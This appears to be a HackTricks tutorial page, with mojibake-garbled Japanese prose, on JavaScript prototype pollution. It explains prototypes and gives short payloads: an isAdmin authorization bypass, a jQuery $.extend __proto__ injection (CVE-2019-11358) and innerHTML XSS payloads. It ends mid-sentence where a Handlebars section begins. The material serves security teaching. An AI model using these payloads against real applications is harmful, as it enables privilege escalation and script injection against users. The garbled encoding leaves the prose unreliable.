# NodeJS - \_\_proto\_\_ & prototype Pollution

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## JavaScriptã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ <a href="#id-053a" id="id-053a"></a>

JavaScriptã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯ã€æœ¬è³ªçš„ã«ã‚­ãƒ¼ã¨å€¤ã®ãƒšã‚¢ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã‚ã‚Šã€ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¨ã—ã¦çŸ¥ã‚‰ã‚Œã¦ã„ã¾ã™ã€‚ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯ã€`Object.create`ã‚’ä½¿ç”¨ã—ã¦`null`ã‚’å¼•æ•°ã«æŒ‡å®šã™ã‚‹ã“ã¨ã§ç©ºã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ç”Ÿæˆã§ãã¾ã™ã€‚ã“ã®ãƒ¡ã‚½ãƒƒãƒ‰ã¯ã€ç¶™æ‰¿ã•ã‚ŒãŸãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãªã—ã§ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
ç©ºã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯ç©ºã®è¾æ›¸ã«ä¼¼ã¦ãŠã‚Šã€`{}`ã¨ã—ã¦è¡¨ã•ã‚Œã¾ã™ã€‚

### JavaScriptã®é–¢æ•°ã¨ã‚¯ãƒ©ã‚¹

JavaScriptã§ã¯ã€ã‚¯ãƒ©ã‚¹ã¨é–¢æ•°ã¯å¯†æ¥ã«é–¢é€£ã—ã¦ãŠã‚Šã€é–¢æ•°ã¯ã—ã°ã—ã°ã‚¯ãƒ©ã‚¹ã®ã‚³ãƒ³ã‚¹ãƒˆãƒ©ã‚¯ã‚¿ã¨ã—ã¦æ©Ÿèƒ½ã—ã¾ã™ã€‚JavaScriptã«ã¯ãƒã‚¤ãƒ†ã‚£ãƒ–ã®ã‚¯ãƒ©ã‚¹ã‚µãƒãƒ¼ãƒˆãŒãªã„ã«ã‚‚ã‹ã‹ã‚ã‚‰ãšã€ã‚³ãƒ³ã‚¹ãƒˆãƒ©ã‚¯ã‚¿ã¯ã‚¯ãƒ©ã‚¹ã®å‹•ä½œã‚’ã‚¨ãƒŸãƒ¥ãƒ¬ãƒ¼ãƒˆã§ãã¾ã™ã€‚
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### Prototypes in JavaScript

JavaScriptã¯ã€ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—å±æ€§ã®å¤‰æ›´ã€è¿½åŠ ã€ã¾ãŸã¯å‰Šé™¤ã‚’ãƒ©ãƒ³ã‚¿ã‚¤ãƒ ã§è¨±å¯ã—ã¾ã™ã€‚ã“ã®æŸ”è»Ÿæ€§ã«ã‚ˆã‚Šã€ã‚¯ãƒ©ã‚¹æ©Ÿèƒ½ã®å‹•çš„æ‹¡å¼µãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚

`toString`ã‚„`valueOf`ã®ã‚ˆã†ãªé–¢æ•°ã¯ã€ãã®å‹•ä½œã‚’å¤‰æ›´ã™ã‚‹ãŸã‚ã«å¤‰æ›´å¯èƒ½ã§ã‚ã‚Šã€JavaScriptã®ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ã‚·ã‚¹ãƒ†ãƒ ã®é©å¿œæ€§ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚

## Inheritance

ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ãƒ™ãƒ¼ã‚¹ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°ã§ã¯ã€ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£/ãƒ¡ã‚½ãƒƒãƒ‰ã¯ã‚¯ãƒ©ã‚¹ã‹ã‚‰ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ç¶™æ‰¿ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚¯ãƒ©ã‚¹ã¯ã€åˆ¥ã®ã‚¯ãƒ©ã‚¹ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã¾ãŸã¯ç©ºã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£/ãƒ¡ã‚½ãƒƒãƒ‰ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§ä½œæˆã•ã‚Œã¾ã™ã€‚

ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ã¨ã—ã¦ä»–ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«æ©Ÿèƒ½ã™ã‚‹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆï¼ˆä¾‹ãˆã°`myPersonObj`ï¼‰ã«ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãŒè¿½åŠ ã•ã‚Œã‚‹ã¨ã€ç¶™æ‰¿ã™ã‚‹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯ã“ã®æ–°ã—ã„ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã“ã¨ã«æ³¨æ„ãŒå¿…è¦ã§ã™ã€‚ãŸã ã—ã€ã“ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯æ˜ç¤ºçš„ã«å‘¼ã³å‡ºã•ã‚Œãªã„é™ã‚Šã€è‡ªå‹•çš„ã«ã¯è¡¨ç¤ºã•ã‚Œã¾ã›ã‚“ã€‚

## \_\_proto\_\_ pollution <a href="#id-0d0a" id="id-0d0a"></a>

## Exploring Prototype Pollution in JavaScript

JavaScriptã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯ã‚­ãƒ¼ã¨å€¤ã®ãƒšã‚¢ã«ã‚ˆã£ã¦å®šç¾©ã•ã‚Œã€JavaScriptã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ã‹ã‚‰ç¶™æ‰¿ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã§ã€ç’°å¢ƒå†…ã®ã™ã¹ã¦ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«å½±éŸ¿ã‚’ä¸ãˆã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚

åˆ¥ã®ä¾‹ã‚’ä½¿ã£ã¦èª¬æ˜ã—ã¾ã—ã‚‡ã†ï¼š
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
Objectãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã¯ã€æ¬¡ã®æ–¹æ³•ã§å¯èƒ½ã§ã™ï¼š
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
Objectãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ã«ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§ã€ã™ã¹ã¦ã®JavaScriptã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯ã“ã‚Œã‚‰ã®æ–°ã—ã„ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’ç¶™æ‰¿ã—ã¾ã™ï¼š
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“

`__proto__` ã®ä½¿ç”¨ãŒåˆ¶é™ã•ã‚Œã¦ã„ã‚‹ã‚·ãƒŠãƒªã‚ªã§ã¯ã€é–¢æ•°ã®ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ãŒä»£æ›¿æ‰‹æ®µã§ã™:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
ã“ã‚Œã¯ã€`Vehicle` ã‚³ãƒ³ã‚¹ãƒˆãƒ©ã‚¯ã‚¿ã‹ã‚‰ä½œæˆã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã¿ã«å½±éŸ¿ã‚’ä¸ãˆã€`beep`ã€`hasWheels`ã€`honk`ã€ãŠã‚ˆã³ `isElectric` ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’ä¸ãˆã¾ã™ã€‚

ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã‚’é€šã˜ã¦JavaScriptã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ã‚°ãƒ­ãƒ¼ãƒãƒ«ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹2ã¤ã®æ–¹æ³•ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

1. `Object.prototype` ã‚’ç›´æ¥æ±šæŸ“ã™ã‚‹ã“ã¨ï¼š
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. ä¸€èˆ¬çš„ã«ä½¿ç”¨ã•ã‚Œã‚‹æ§‹é€ ä½“ã®ã‚³ãƒ³ã‚¹ãƒˆãƒ©ã‚¯ã‚¿ã®ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ã‚’æ±šæŸ“ã™ã‚‹ã“ã¨:
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
ã“ã‚Œã‚‰ã®æ“ä½œã®å¾Œã€ã™ã¹ã¦ã®JavaScriptã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯`goodbye`ãŠã‚ˆã³`greet`ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

## ä»–ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’æ±šæŸ“ã™ã‚‹

### ã‚¯ãƒ©ã‚¹ã‹ã‚‰Object.prototypeã¸

ç‰¹å®šã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’**æ±šæŸ“**ã§ãã€**`Object.prototype`ã«åˆ°é”ã™ã‚‹å¿…è¦ãŒã‚ã‚‹**ã‚·ãƒŠãƒªã‚ªã§ã¯ã€æ¬¡ã®ã‚ˆã†ãªã‚³ãƒ¼ãƒ‰ã§ãã‚Œã‚’æ¤œç´¢ã§ãã¾ã™ï¼š
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Array elements pollution

ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®å±æ€§ã‚’æ±šæŸ“ã§ãã‚‹ã‚ˆã†ã«ã€JSã§é…åˆ—ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦æ±šæŸ“ã§ãã‚‹å ´åˆã€**ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ã«ã‚ˆã£ã¦ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ãªé…åˆ—ã®å€¤ã‚‚æ±šæŸ“ã§ãã¾ã™**ï¼ˆå€¤ã‚’ä¸Šæ›¸ãã™ã‚‹ã“ã¨ã¯ã§ããªã„ã®ã§ã€ä½•ã‚‰ã‹ã®å½¢ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ãŒæ›¸ãè¾¼ã¾ã‚Œã¦ã„ãªã„ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ã‚’æ±šæŸ“ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Html elements pollution

JSã‚’ä»‹ã—ã¦HTMLè¦ç´ ã‚’ç”Ÿæˆã™ã‚‹éš›ã€**`innerHTML`**å±æ€§ã‚’**ä¸Šæ›¸ã**ã—ã¦**ä»»æ„ã®HTMLã‚³ãƒ¼ãƒ‰ã‚’**æ›¸ãè¾¼ã‚€ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚[ã“ã®æ›¸ãè¾¼ã¿ã‹ã‚‰ã®ã‚¢ã‚¤ãƒ‡ã‚¢ã¨ä¾‹](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/)ã€‚

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## ä¾‹

### åŸºæœ¬çš„ãªä¾‹

ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã¯ã€`Object.prototype`ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’ä¸Šæ›¸ãã™ã‚‹ã“ã¨ã‚’è¨±å¯ã™ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®æ¬ é™¥ã«ã‚ˆã£ã¦ç™ºç”Ÿã—ã¾ã™ã€‚ã“ã‚Œã¯ã€ã»ã¨ã‚“ã©ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒ`Object.prototype`ã‹ã‚‰ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’ç¶™æ‰¿ã™ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚

æœ€ã‚‚ç°¡å˜ãªä¾‹ã¯ã€ãƒã‚§ãƒƒã‚¯ã•ã‚Œã‚‹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®**æœªå®šç¾©ã®å±æ€§ã«å€¤ã‚’è¿½åŠ ã™ã‚‹**ã“ã¨ã§ã™ã€‚
```javascript
if (user.admin) {
```
ã‚‚ã—å±æ€§ **`admin` ãŒæœªå®šç¾©** ã®å ´åˆã€PPã‚’æ‚ªç”¨ã—ã¦Trueã«è¨­å®šã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
ã“ã®ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã¯ã€æ”»æ’ƒè€…ãŒç‰¹å®šã®å…¥åŠ›ã‚’åˆ¶å¾¡ã§ãã‚‹å ´åˆã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å†…ã®ã™ã¹ã¦ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ã‚’å¤‰æ›´ã§ãã‚‹ã‚ˆã†ã«ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’æ“ä½œã™ã‚‹ã“ã¨ã«é–¢ä¿‚ã—ã¦ã„ã¾ã™ã€‚ã“ã®æ“ä½œã¯é€šå¸¸ã€`__proto__`ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’è¨­å®šã™ã‚‹ã“ã¨ã‚’å«ã¿ã€JavaScriptã§ã¯ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ã‚’ç›´æ¥å¤‰æ›´ã™ã‚‹ã“ã¨ã¨åŒç¾©ã§ã™ã€‚

ã“ã®æ”»æ’ƒãŒæˆåŠŸè£ã«å®Ÿè¡Œã•ã‚Œã‚‹æ¡ä»¶ã¯ã€ç‰¹å®šã®[ç ”ç©¶](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf)ã«æ¦‚èª¬ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€ä»¥ä¸‹ã‚’å«ã¿ã¾ã™ï¼š

* å†å¸°çš„ãƒãƒ¼ã‚¸ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã€‚
* ãƒ‘ã‚¹ã«åŸºã¥ã„ã¦ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’å®šç¾©ã™ã‚‹ã“ã¨ã€‚
* ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ã‚¯ãƒ­ãƒ¼ãƒ³ã™ã‚‹ã“ã¨ã€‚

### Override function
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Pollution to RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

ä»–ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰:

* [https://github.com/KTH-LangSec/server-side-prototype-pollution](https://github.com/KTH-LangSec/server-side-prototype-pollution)

## ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã®ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã‹ã‚‰XSSã¸

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019â€“11358: jQuery $ .extendã‚’é€šã˜ãŸãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“æ”»æ’ƒ

[è©³ç´°ã«ã¤ã„ã¦ã¯ã“ã®è¨˜äº‹ã‚’å‚ç…§ã—ã¦ãã ã•ã„](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7) jQueryã§ã¯ã€`$ .extend`é–¢æ•°ãŒæ·±ã„ã‚³ãƒ”ãƒ¼æ©Ÿèƒ½ã‚’ä¸é©åˆ‡ã«åˆ©ç”¨ã™ã‚‹ã¨ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã‚’å¼•ãèµ·ã“ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®é–¢æ•°ã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã‚¯ãƒ­ãƒ¼ãƒ³ã‚„ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‹ã‚‰ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã®ãƒãƒ¼ã‚¸ã«ã‚ˆãä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã—ã‹ã—ã€èª¤ã£ã¦è¨­å®šã•ã‚ŒãŸå ´åˆã€æ–°ã—ã„ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆç”¨ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãŒãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ã«å‰²ã‚Šå½“ã¦ã‚‰ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
ã“ã®è„†å¼±æ€§ã¯CVE-2019â€“11358ã¨ã—ã¦ç‰¹å®šã•ã‚Œã¦ãŠã‚Šã€ãƒ‡ã‚£ãƒ¼ãƒ—ã‚³ãƒ”ãƒ¼ãŒãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ã‚’æ„å›³ã›ãšã«å¤‰æ›´ã™ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€`isAdmin`ã®ã‚ˆã†ãªãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãŒé©åˆ‡ãªå­˜åœ¨ç¢ºèªãªã—ã«ãƒã‚§ãƒƒã‚¯ã•ã‚Œã‚‹ã¨ã€æœªæ‰¿èªã®ç®¡ç†è€…ã‚¢ã‚¯ã‚»ã‚¹ãªã©ã®æ½œåœ¨çš„ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒªã‚¹ã‚¯ãŒç”Ÿã˜ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### CVE-2018â€“3721ã€CVE-2019â€“10744: lodashã«ã‚ˆã‚‹ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“æ”»æ’ƒ

[è©³ç´°ã«ã¤ã„ã¦ã¯ã“ã®è¨˜äº‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash)ã¯ã€åŒæ§˜ã®ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“è„†å¼±æ€§ï¼ˆCVE-2018â€“3721ã€CVE-2019â€“10744ï¼‰ã«ç›´é¢ã—ã¾ã—ãŸã€‚ã“ã‚Œã‚‰ã®å•é¡Œã¯ãƒãƒ¼ã‚¸ãƒ§ãƒ³4.17.11ã§å¯¾å‡¦ã•ã‚Œã¾ã—ãŸã€‚

### CVEã‚’å«ã‚€åˆ¥ã®ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã‚’æ¤œå‡ºã™ã‚‹ãŸã‚ã®ãƒ„ãƒ¼ãƒ«

* [**Server-Side-Prototype-Pollution-Gadgets-Scanner**](https://github.com/doyensec/Server-Side-Prototype-Pollution-Gadgets-Scanner): ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ãŠã‘ã‚‹ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã®ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“è„†å¼±æ€§ã‚’æ¤œå‡ºãŠã‚ˆã³åˆ†æã™ã‚‹ãŸã‚ã«è¨­è¨ˆã•ã‚ŒãŸBurp Suiteæ‹¡å¼µæ©Ÿèƒ½ã€‚ã“ã®ãƒ„ãƒ¼ãƒ«ã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ã‚¹ã‚­ãƒ£ãƒ³ã—ã¦æ½œåœ¨çš„ãªãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã®å•é¡Œã‚’ç‰¹å®šã™ã‚‹ãƒ—ãƒ­ã‚»ã‚¹ã‚’è‡ªå‹•åŒ–ã—ã¾ã™ã€‚æ—¢çŸ¥ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆ - ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã‚’åˆ©ç”¨ã—ã¦æœ‰å®³ãªã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹æ–¹æ³• - ã‚’æ‚ªç”¨ã—ã€ç‰¹ã«Node.jsãƒ©ã‚¤ãƒ–ãƒ©ãƒªã«ç„¦ç‚¹ã‚’å½“ã¦ã¦ã„ã¾ã™ã€‚
* [**server-side-prototype-pollution**](https://github.com/portswigger/server-side-prototype-pollution): ã“ã®æ‹¡å¼µæ©Ÿèƒ½ã¯ã€ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã®ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“è„†å¼±æ€§ã‚’ç‰¹å®šã—ã¾ã™ã€‚[ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“](https://portswigger.net/research/server-side-prototype-pollution)ã§èª¬æ˜ã•ã‚Œã¦ã„ã‚‹æŠ€è¡“ã‚’ä½¿ç”¨ã—ã¦ã„ã¾ã™ã€‚

### NodeJSã«ãŠã‘ã‚‹ASTãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“

NodeJSã¯ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã‚„TypeScriptãªã©ã®æ©Ÿèƒ½ã®ãŸã‚ã«JavaScriptã§æŠ½è±¡æ§‹æ–‡æœ¨ï¼ˆASTï¼‰ã‚’åºƒç¯„ã«åˆ©ç”¨ã—ã¦ã„ã¾ã™ã€‚ã“ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€ç‰¹ã«Handlebarsã¨Pugã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã«é–¢é€£ã™ã‚‹ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã«é–¢ã™ã‚‹è„†å¼±æ€§ã‚’æ¢ã‚Šã¾ã™ã€‚

#### Handlebarsè„†å¼±æ€§åˆ†æ

Handlebarsãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã¯ã€ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“æ”»æ’ƒã«å¯¾ã—ã¦è„†å¼±ã§ã™ã€‚ã“ã®è„†å¼±æ€§ã¯ã€`javascript-compiler.js`ãƒ•ã‚¡ã‚¤ãƒ«å†…ã®ç‰¹å®šã®é–¢æ•°ã‹ã‚‰ç”Ÿã˜ã¾ã™ã€‚ä¾‹ãˆã°ã€`appendContent`é–¢æ•°ã¯ã€`pendingContent`ãŒå­˜åœ¨ã™ã‚‹å ´åˆã«ãã‚Œã‚’é€£çµã—ã€`pushSource`é–¢æ•°ã¯ã‚½ãƒ¼ã‚¹ã‚’è¿½åŠ ã—ãŸå¾Œã«`pendingContent`ã‚’`undefined`ã«ãƒªã‚»ãƒƒãƒˆã—ã¾ã™ã€‚

**æ‚ªç”¨ãƒ—ãƒ­ã‚»ã‚¹**

æ‚ªç”¨ã¯ã€Handlebarsã«ã‚ˆã£ã¦ç”Ÿæˆã•ã‚ŒãŸASTï¼ˆæŠ½è±¡æ§‹æ–‡æœ¨ï¼‰ã‚’åˆ©ç”¨ã—ã€ä»¥ä¸‹ã®æ‰‹é †ã«å¾“ã„ã¾ã™ï¼š

